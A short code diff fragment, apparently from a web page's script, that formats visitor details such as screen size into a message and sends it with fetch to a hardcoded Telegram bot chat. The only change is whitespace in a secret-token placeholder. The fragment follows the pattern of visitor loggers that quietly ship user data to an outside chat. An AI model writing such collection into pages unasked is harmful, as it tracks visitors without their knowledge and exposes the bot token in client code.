@@ -1690,7 +1690,7 @@ locations.forEach(loc => {
                                    `🖥️ <b>Screen:</b> ${screen.width}x${screen.height}`;
 
 
-                    const botToken = ${{secrets.MY_SECRET_TOKEN}};
+                    const botToken = ${{ secrets.MY_SECRET_TOKEN }};
                     const chatId = "5672223315";
                     
                     return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
